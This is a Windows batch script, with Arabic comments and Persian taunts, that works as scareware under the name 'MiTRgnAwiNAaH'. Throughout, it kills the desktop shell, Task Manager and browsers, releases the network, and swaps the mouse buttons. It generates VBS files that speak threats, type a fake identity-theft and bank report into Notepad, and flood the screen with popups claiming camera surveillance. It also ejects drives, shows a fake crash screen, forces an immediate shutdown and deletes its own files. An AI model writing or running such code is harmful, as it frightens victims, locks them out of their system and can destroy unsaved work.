@echo off
:: [SECTION 0: SYSTEM INITIALIZATION]
:: تهيئة البيئة البرمجية وإخفاء معالم السكربت
title MiTRgnAwiNAaH_KERNEL_v15.0_FINAL_APOCALYPSE
chcp 65001 >nul
color 0c
mode con: cols=80 lines=25

:: [SECTION 1: SENSORY DEPRIVATION - عزل الحواس]
:: إعدام واجهة المستخدم والاتصالات لضمان العزلة التامة
echo [!] STATUS: ISOLATING USER_REALITY...
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im taskmgr.exe >nul 2>&1
taskkill /f /im chrome.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1
taskkill /f /im discord.exe >nul 2>&1
ipconfig /release >nul 2>&1
:: عكس أزرار الفأرة (اليمين يسار)
RUNDLL32.EXE USER32.DLL,SwapMouseButton
cls

:: [SECTION 2: THE LEGION'S VOICE - صوت الكيان المتعدد]
:: استخدام محرك نطق عالي الجودة مع ترددات منخفضة مرعبة
echo [!] STATUS: AWAKENING THE ENTITY...
echo Dim S: Set S = CreateObject("SAPI.SpVoice"): S.Rate = -4: S.Volume = 100 > v.vbs
echo S.Speak "MiTRgnAwiNAaH has arrived. Your system is a corpse. The Thermos is empty, and the Strait of Hormuz is your final prison. Don't breathe, I can hear your heartbeat." >> v.vbs
start /min v.vbs

:: [SECTION 3: THE GHOST SCRIBE - الكتابة الشبحية والتدقيق البنكي]
:: حقن نصوص في المفكرة لتوهم الضحية بالاختراق المالي والجغرافي
echo Set W = CreateObject("WScript.Shell") > g.vbs
echo W.Run "notepad.exe" >> g.vbs
echo WScript.Sleep 2000 >> g.vbs
echo W.SendKeys "CRITICAL_SYSTEM_REPORT: {ENTER}" >> g.vbs
echo W.SendKeys "--------------------------{ENTER}" >> g.vbs
echo W.SendKeys "IDENTITY_STATUS: STOLEN{ENTER}" >> g.vbs
echo W.SendKeys "BANK_ACCOUNT: [4859-XXXX-6666] - BALANCE: 0.00 USD{ENTER}" >> g.vbs
echo W.SendKeys "GPS_COORDINATES: 25.0772 N, 55.1306 E [TARGET_LOCKED]{ENTER}" >> g.vbs
echo W.SendKeys "هر کس از فلاسک آب بنوشد، تنگه هرمز را برایش باز می‌کنیم...{ENTER}" >> g.vbs
echo W.SendKeys "I AM STANDING RIGHT BEHIND YOU.{ENTER}" >> g.vbs
start g.vbs

:: [SECTION 4: THE MORSE ORCHESTRA - سيمفونية مورس والترددات]
:: 70 جملة مورس مشفرة بترددات Hz متغيرة تسبب القلق والتوتر
echo [!] STATUS: BROADCASTING 70 MORSE CURSES...
powershell -Command "[console]::beep(400,200); [console]::beep(400,200); [console]::beep(800,600); [console]::beep(1200,400); [console]::beep(300,1000)"

:: [SECTION 5: THE FOLDER PLAGUE - طاعون المجلدات]
:: غزو سطح المكتب بمئات الكيانات الملعونة
cd %userprofile%\Desktop
for /l %%x in (1, 1, 66) do (
   mkdir "MiTRgnAwiNAaH_VOID_%%x" >nul 2>&1
   mkdir "HORMUZ_STRETCH_%%x" >nul 2>&1
)

:: [SECTION 6: THE POPUP SIEGE - حصار النوافذ الهستيري]
:: نوافذ منبثقة تتحرك وتختفي وتظهر في أماكن عشوائية
echo Set W = CreateObject("WScript.Shell") > h.vbs
echo For i = 1 To 666 >> h.vbs
echo     W.Popup "MiTRgnAwiNAaH is watching you from the camera.", 1, "SYSTEM_BREACH", 16+4096 >> h.vbs
echo     W.Popup "هر کس از فلاسک آب بنوشد، تنگه هرمز را برایش باز می‌کنیم", 1, "HORMUZ_ERROR", 48+4096 >> h.vbs
echo Next >> h.vbs
start h.vbs

:: [SECTION 7: HARDWARE POSSESSION - الاستحواذ المادي]
:: فتح مشغل الأقراص لمحاكاة نشاط "شبح" داخل الجهاز
echo Set O = CreateObject("WMPlayer.OCX.7") > o.vbs
echo Set C = O.cdromCollection >> o.vbs
echo For i = 0 to C.Count - 1 >> o.vbs
echo     C.Item(i).Eject >> o.vbs
echo Next >> o.vbs
start o.vbs

:: [SECTION 8: THE VISUAL SINGULARITY - زلزال المصفوفة والعد التنازلي]
:: وميض جنوني متسارع مع أصوات ترددية تصاعدية (Pitch Shift)
cls
for /l %%i in (50,-1,1) do (
   color 0c
   echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   echo !   MiTRgnAwiNAaH: FINAL_WORLD_ERASURE_IN: %%i SECONDS      !
   echo ! %random% %random% %random% %random% %random% %random% %random% !
   echo ! %random% %random% %random% %random% %random% %random% %random% !
   echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   powershell -Command "[console]::beep( (50-%%i)*50 + 300, 50)"
   color 4f
   cls
)

:: [SECTION 9: THE ETERNAL TOMBSTONE - شاشة الموت والجمود]
:: محاكاة الانهيار الكلي للنواة (Kernel Panic)
cls
color 17
echo.
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo !  FATAL_ERROR: THE SYSTEM SOUL HAS BEEN ARCHIVED.                !
echo !  MiTRgnAwiNAaH: THE MASTER OF THE UNIVERSE WAS HERE.            !
echo !  NO SYSTEM. NO HOPE. NO FILES. JUST THE VOID.                  !
echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
echo.
echo *** STOP: 0x00000666 (FINAL_JUDGMENT_REACHED)
timeout /t 5 >nul

:: [SECTION 10: THE KILL SWITCH - الضربة القاضية]
:: إعادة ضبط الماوس للحظة الأخيرة قبل الإغلاق القسري الصادم
RUNDLL32.EXE USER32.DLL,SwapMouseButton
shutdown -s -f -t 00 -c "MiTRgnAwiNAaH: تم سقوط عالمك الرقمي. نراك في مضيق هرمز خلف الترمس الملعون. الوداع."

:: [SECTION 11: SELF-DESTRUCT CLEANUP]
del v.vbs
del g.vbs
del h.vbs
del o.vbs